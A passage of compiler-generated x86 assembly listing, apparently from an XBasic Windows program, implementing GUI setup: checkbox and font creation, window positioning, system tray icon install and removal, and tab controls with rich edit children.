; [1834] #check6 = NewChild ("button", "adler crc", $$BS_AUTOCHECKBOX , left+88+69, top+18, 70, 15, hwnd, 406, 0)
data section 'globals$shared'
align	4
%#check6.client:	db 4 dup ?
.code
	mov	eax,addr @_string.040C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,addr @_string.0438.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-88]			;;; i665
	add	eax,88			;;; i775
	add	eax,69			;;; i775
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-92]			;;; i665
	add	eax,18			;;; i775
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	406			;;; i656a
	push	[ebp-96]			;;; i674a
	push	15			;;; i656a
	push	70			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	3			;;; i656a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#check6.client],eax			;;; i668
;
; [1837] #hFontArial = NewFont ("Arial", 10, $$FW_NORMAL, $$TRUE, $$FALSE)
	mov	eax,addr @_string.044D.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	0			;;; i656a
	push	-1			;;; i656a
	push	400			;;; i656a
	push	10			;;; i656a
	push	[ebp-60]			;;; i674a
	call	func16.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
	mov	d[%#hFontArial.client],eax			;;; i668
;
; [1838] #hFontArial2 = NewFont ("Arial", 9, $$FW_LIGHT, $$FALSE, $$FALSE)
data section 'globals$shared'
align	4
%#hFontArial2.client:	db 4 dup ?
.code
	mov	eax,addr @_string.044D.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	300			;;; i656a
	push	9			;;; i656a
	push	[ebp-60]			;;; i674a
	call	func16.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
	mov	d[%#hFontArial2.client],eax			;;; i668
;
; [1839] #hFontArial3 = NewFont ("Arial", 10, $$FW_NORMAL, $$FALSE, $$FALSE)
data section 'globals$shared'
align	4
%#hFontArial3.client:	db 4 dup ?
.code
	mov	eax,addr @_string.044D.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	400			;;; i656a
	push	10			;;; i656a
	push	[ebp-60]			;;; i674a
	call	func16.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
	mov	d[%#hFontArial3.client],eax			;;; i668
;
; [1840] SetNewFont (#group7, #hFontArial): SetNewFont (#group6, #hFontArial)
	push	[%#hFontArial.client]			;;; i672a
	push	[%#group7.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial.client]			;;; i672a
	push	[%#group6.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1841] SetNewFont (#group3, #hFontArial): SetNewFont (#group4, #hFontArial)
	push	[%#hFontArial.client]			;;; i672a
	push	[%#group3.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial.client]			;;; i672a
	push	[%#group4.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1842] SetNewFont (#edit9, #hFontArial2): SetNewFont (#edit10, #hFontArial2)
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit9.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit10.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1843] SetNewFont (#edit3, #hFontArial2): SetNewFont (#edit4, #hFontArial2)
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit3.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit4.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1844] SetNewFont (#edit6, #hFontArial2): SetNewFont (#edit7, #hFontArial2):
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit6.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#edit7.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1845] SetNewFont (#button1, #hFontArial2): SetNewFont (#button2, #hFontArial2)
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#button1.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#button2.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1846] SetNewFont (#button3, #hFontArial2): SetNewFont (#button4, #hFontArial2)
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#button3.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial2.client]			;;; i672a
	push	[%#button4.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1847] SetNewFont (#text1, #hFontArial3): SetNewFont (#text3, #hFontArial3)
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#text1.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#text3.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1848] SetNewFont (#check1, #hFontArial3):	SetNewFont (#check2, #hFontArial3)
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check1.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check2.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1849] SetNewFont (#check3, #hFontArial3):	SetNewFont (#check5, #hFontArial3)
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check3.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check5.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1850] SetNewFont (#check4, #hFontArial3): SetNewFont (#check6, #hFontArial3)
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check4.client]			;;; i672a
	call	func17.client			;;; i619
	push	[%#hFontArial3.client]			;;; i672a
	push	[%#check6.client]			;;; i672a
	call	func17.client			;;; i619
;
; [1852] SendMessageA (#hTabCtl, $$TCM_SETCURFOCUS, 1, 0)
	push	0			;;; i656a
	push	1			;;; i656a
	push	4912			;;; i656a
	push	[%#hTabCtl.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1853] SendMessageA (#hTabCtl, $$TCM_SETCURFOCUS, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	4912			;;; i656a
	push	[%#hTabCtl.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1855] '	InitTreeViewImageList(#tree_tab)
;
; [1856] SetWindowPos (#winMain, 0, 350, 300, 0, 0, $$SWP_NOSIZE | $$SWP_NOZORDER)
	mov	eax,1			;;; i659
	or	eax,4			;;; i763
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	push	300			;;; i656a
	push	350			;;; i656a
	push	0			;;; i656a
	push	[%#winMain.client]			;;; i672a
	call	_SetWindowPos@28			;;; i619
;
; [1857] ShowWindow (#winMain, $$SW_SHOWNORMAL)
	push	1			;;; i656a
	push	[%#winMain.client]			;;; i672a
	call	_ShowWindow@8			;;; i619
;
; [1859] '	hImageList = ImageList_LoadImage (hInst, &"treeviewicons", 16, 1, RGB (255, 0, 255), $$IMAGE_BITMAP, $$LR_LOADTRANSPARENT)
;
; [1860] '	SendMessageA (#tree_tab, $$TVM_SETIMAGELIST, $$TVSIL_NORMAL, hImageList)
;
; [1862] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CreateWindows.client:  ;;; Function end label for Assembly Programmers.
end.func9.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func9.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func9.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  CreateWindows ()  *****
;  *****
;
; [1864] FUNCTION RemoveTrayIcon ()
.code
align 16
_RemoveTrayIcon.client@0:
;  *****
;  *****  FUNCTION  RemoveTrayIcon ()  *****
;  *****
func1A.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.336:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.336			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody1A.client:
;
; [1865] NOTIFYICONDATA ndata
; .composites = ebp-40	; internal variable
#ifdef RemoveTrayIcon.ndata
#undef RemoveTrayIcon.ndata
#endif
#define RemoveTrayIcon.ndata ebp-44	; exposes local variable 'ndata'
;
;
; [1867] IF #winMain THEN
	mov	eax,d[%#winMain.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00C1.client			;;; i221
;
; [1868] ndata.hWnd = #winMain
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[%#winMain.client]			;;; i663a
	mov	d[eax+4],ebx			;;; i13b
;
; [1869] ndata.uID = 2000
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2000			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [1870] Shell_NotifyIconA ($$NIM_DELETE,&ndata)
;
; [0] EXTERNAL FUNCTION Shell_NotifyIconA (dwMessage, addrNOTIFYICONDATA)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	2			;;; i656a
	call	_Shell_NotifyIconA@8			;;; i619
;
; [1871] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func1A.client			;;; i258
;
; [1872] ELSE
	jmp	end.if.00C1.client			;;; i107
else.00C1.client:
;
; [1873] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func1A.client			;;; i258
;
; [1874] END IF
end.if.00C1.client:
;
; [1876] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.RemoveTrayIcon.client:  ;;; Function end label for Assembly Programmers.
end.func1A.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  RemoveTrayIcon ()  *****
;  *****
;
; [1878] FUNCTION InstallTrayIcon (hwnd)
.code
;
#ifdef InstallTrayIcon.hwnd
#undef InstallTrayIcon.hwnd
#endif
#define InstallTrayIcon.hwnd ebp+8	; exposes function argument 'hwnd'
;
align 16
_InstallTrayIcon.client@4:
;  *****
;  *****  FUNCTION  InstallTrayIcon ()  *****
;  *****
func19.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.340:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.340			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody19.client:
;
; [1879] NOTIFYICONDATA ndata
; .composites = ebp-40	; internal variable
#ifdef InstallTrayIcon.ndata
#undef InstallTrayIcon.ndata
#endif
#define InstallTrayIcon.ndata ebp-44	; exposes local variable 'ndata'
;
;
; [1881] ndata.cbSize = SIZE(NOTIFYICONDATA)
	mov	eax,88			;;; i584
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [1882] ndata.hWnd = hwnd
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp+8]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [1883] ndata.uID = 2000
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2000			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [1884] ndata.uFlags = $$NIF_ICON | $$NIF_MESSAGE' | $$NIF_TIP
	mov	eax,2			;;; i659
	or	eax,1			;;; i763
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [1885] ndata.uCallbackMessage = $$WM_TRAYICON
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1025			;;; i659
	mov	d[eax+16],ebx			;;; i13b
;
; [1886] ndata.hIcon = LoadIconA (GetModuleHandleA(0),&"xscience")
	push	0			;;; i656a
	call	_GetModuleHandleA@4			;;; i619
; .xstk19.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	mov	eax,addr @_string.03D1.client			;;; i642
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	call	_LoadIconA@8			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+20],eax			;;; i13b
;
; [1887] ndata.szTip = ""
	mov	eax,d[ebp-44]			;;; i665
	xor	ebx,ebx			;;; i658
	lea	edi,[eax+24]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,64			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [1888] Shell_NotifyIconA($$NIM_ADD,&ndata)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	call	_Shell_NotifyIconA@8			;;; i619
;
; [1889] DestroyIcon (ndata.hIcon)
;
; [0] EXTERNAL FUNCTION DestroyIcon (hIcon)
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	push	eax			;;; i667a
	call	_DestroyIcon@4			;;; i619
;
; [1891] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InstallTrayIcon.client:  ;;; Function end label for Assembly Programmers.
end.func19.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  InstallTrayIcon ()  *****
;  *****
;
; [1893] FUNCTION AddRichEditTabChild (hparent,STRING title,IDC,style)
.code
;
#ifdef AddRichEditTabChild.hparent
#undef AddRichEditTabChild.hparent
#endif
#define AddRichEditTabChild.hparent ebp+8	; exposes function argument 'hparent'
;
;
#ifdef AddRichEditTabChild.title
#undef AddRichEditTabChild.title
#endif
#define AddRichEditTabChild.title ebp+12	; exposes function argument 'title'
;
;
#ifdef AddRichEditTabChild.IDC
#undef AddRichEditTabChild.IDC
#endif
#define AddRichEditTabChild.IDC ebp+16	; exposes function argument 'IDC'
;
;
#ifdef AddRichEditTabChild.style
#undef AddRichEditTabChild.style
#endif
#define AddRichEditTabChild.style ebp+20	; exposes function argument 'style'
;
align 16
_AddRichEditTabChild.client@16:
;  *****
;  *****  FUNCTION  AddRichEditTabChild ()  *****
;  *****
func66.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.347:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.347			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody66.client:
;
; [1894] SHARED TabChildCon[]
;
; [1895] TC_ITEM tci
; .composites = ebp-40	; internal variable
#ifdef AddRichEditTabChild.tci
#undef AddRichEditTabChild.tci
#endif
#define AddRichEditTabChild.tci ebp-44	; exposes local variable 'tci'
;
;
; [1898] found = $$FALSE
#ifdef AddRichEditTabChild.found
#undef AddRichEditTabChild.found
#endif
#define AddRichEditTabChild.found ebp-48	; exposes local variable 'found'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1899] FOR h = 0 TO UBOUND(TabChildCon[])
#ifdef AddRichEditTabChild.h
#undef AddRichEditTabChild.h
#endif
#define AddRichEditTabChild.h ebp-52	; exposes local variable 'h'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.341			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.341:
	dec	eax			;;; i596
; .forlimit66.00C2 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
align 8
for.00C2.client:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00C2.client			;;; i154
;
; [1900] IFZ TabChildCon[h] THEN
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	test	eax,eax			;;; i194
	jnz	>> else.00C3.client			;;; i195
;
; [1901] upper = h
#ifdef AddRichEditTabChild.upper
#undef AddRichEditTabChild.upper
#endif
#define AddRichEditTabChild.upper ebp-60	; exposes local variable 'upper'
;
	mov	eax,d[ebp-52]			;;; i665
	mov	d[ebp-60],eax			;;; i670
;
; [1902] found = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1903] EXIT FOR
	jmp	end.for.00C2.client			;;; i145
;
; [1904] END IF
else.00C3.client:
end.if.00C3.client:
;
; [1905] NEXT h
do.next.00C2.client:
	inc	d[ebp-52]			;;; i229
	jmp	for.00C2.client			;;; i231
end.for.00C2.client:
;
; [1907] IFF found THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00C4.client			;;; i195
;
; [1908] upper = UBOUND(TabChildCon[])
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.343			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.343:
	dec	eax			;;; i596
	mov	d[ebp-60],eax			;;; i670
;
; [1909] INC upper
	inc	d[ebp-60]			;;; i84
;
; [1910] REDIM TabChildCon[upper]
	sub	esp,64			;;; i430
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%TabChildCon.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%TabChildCon.client],eax			;;; i668
;
; [1911] END IF
else.00C4.client:
end.if.00C4.client:
;
; [1913] tci.mask 		= $$TCIF_TEXT
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1914] tci.pszText 	= &title
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [1915] tci.cchTextMax 	= LEN(title)
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.344			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.344:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+16],eax			;;; i13b
;
; [1916] SendMessageA (hparent, $$TCM_INSERTITEM, upper, &tci)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	4871			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1918] exstyle = $$WS_EX_TRANSPARENT | $$WS_EX_ACCEPTFILES | $$WS_EX_STATICEDGE' | $$WS_EX_CONTROLPARENT
#ifdef AddRichEditTabChild.exstyle
#undef AddRichEditTabChild.exstyle
#endif
#define AddRichEditTabChild.exstyle ebp-64	; exposes local variable 'exstyle'
;
	mov	eax,32			;;; i659
	or	eax,16			;;; i763
	or	eax,131072			;;; i763
	mov	d[ebp-64],eax			;;; i670
;
; [1919] 'style = style | $$ES_MULTILINE | $$ES_READONLY | $$ES_LEFT
;
; [1920] 'TabChildCon[upper] = NewChild ("edit", "", style, 1, 20, 300, 300, hparent, IDC, exstyle)
;
; [1921] TabChildCon[upper] = CreateRichEdit (1, 20, 300, 300, hparent, IDC, 30000)
	push	30000			;;; i656a
	push	[ebp+16]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	300			;;; i656a
	push	300			;;; i656a
	push	20			;;; i656a
	push	1			;;; i656a
	call	func65.client			;;; i619
	mov	ebx,d[ebp-60]			;;; i665
	mov	ecx,d[%%%TabChildCon.client]			;;; i663a
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [1923] RETURN TabChildCon[upper]
	mov	eax,d[ebp-60]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	jmp	end.func66.client			;;; i258
;
; [1924] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AddRichEditTabChild.client:  ;;; Function end label for Assembly Programmers.
end.func66.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AddRichEditTabChild ()  *****
;  *****
;
; [1926] FUNCTION AddEditTabChild (hparent,STRING title,IDC,style)
.code
;
#ifdef AddEditTabChild.hparent
#undef AddEditTabChild.hparent
#endif
#define AddEditTabChild.hparent ebp+8	; exposes function argument 'hparent'
;
;
#ifdef AddEditTabChild.title
#undef AddEditTabChild.title
#endif
#define AddEditTabChild.title ebp+12	; exposes function argument 'title'
;
;
#ifdef AddEditTabChild.IDC
#undef AddEditTabChild.IDC
#endif
#define AddEditTabChild.IDC ebp+16	; exposes function argument 'IDC'
;
;
#ifdef AddEditTabChild.style
#undef AddEditTabChild.style
#endif
#define AddEditTabChild.style ebp+20	; exposes function argument 'style'
;
align 16
_AddEditTabChild.client@16:
;  *****
;  *****  FUNCTION  AddEditTabChild ()  *****
;  *****
func2A.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.355:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.355			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody2A.client:
;
; [1927] SHARED TabChildCon[]
;
; [1928] TC_ITEM tci
; .composites = ebp-40	; internal variable
#ifdef AddEditTabChild.tci
#undef AddEditTabChild.tci
#endif
#define AddEditTabChild.tci ebp-44	; exposes local variable 'tci'
;
;
; [1931] found = $$FALSE
#ifdef AddEditTabChild.found
#undef AddEditTabChild.found
#endif
#define AddEditTabChild.found ebp-48	; exposes local variable 'found'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1932] FOR h = 0 TO UBOUND(TabChildCon[])
#ifdef AddEditTabChild.h
#undef AddEditTabChild.h
#endif
#define AddEditTabChild.h ebp-52	; exposes local variable 'h'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.349			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.349:
	dec	eax			;;; i596
; .forlimit2A.00C5 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
align 8
for.00C5.client:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00C5.client			;;; i154
;
; [1933] IFZ TabChildCon[h] THEN
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	test	eax,eax			;;; i194
	jnz	>> else.00C6.client			;;; i195
;
; [1934] upper = h
#ifdef AddEditTabChild.upper
#undef AddEditTabChild.upper
#endif
#define AddEditTabChild.upper ebp-60	; exposes local variable 'upper'
;
	mov	eax,d[ebp-52]			;;; i665
	mov	d[ebp-60],eax			;;; i670
;
; [1935] found = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1936] EXIT FOR
	jmp	end.for.00C5.client			;;; i145
;
; [1937] END IF
else.00C6.client:
end.if.00C6.client:
;
; [1938] NEXT h
do.next.00C5.client:
	inc	d[ebp-52]			;;; i229
	jmp	for.00C5.client			;;; i231
end.for.00C5.client:
;
; [1940] IFF found THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00C7.client			;;; i195
;
; [1941] upper = UBOUND(TabChildCon[])
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.351			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.351:
	dec	eax			;;; i596
	mov	d[ebp-60],eax			;;; i670
;
; [1942] INC upper
	inc	d[ebp-60]			;;; i84
;
; [1943] REDIM TabChildCon[upper]
	sub	esp,64			;;; i430
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%TabChildCon.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%TabChildCon.client],eax			;;; i668
;
; [1944] END IF
else.00C7.client:
end.if.00C7.client:
;
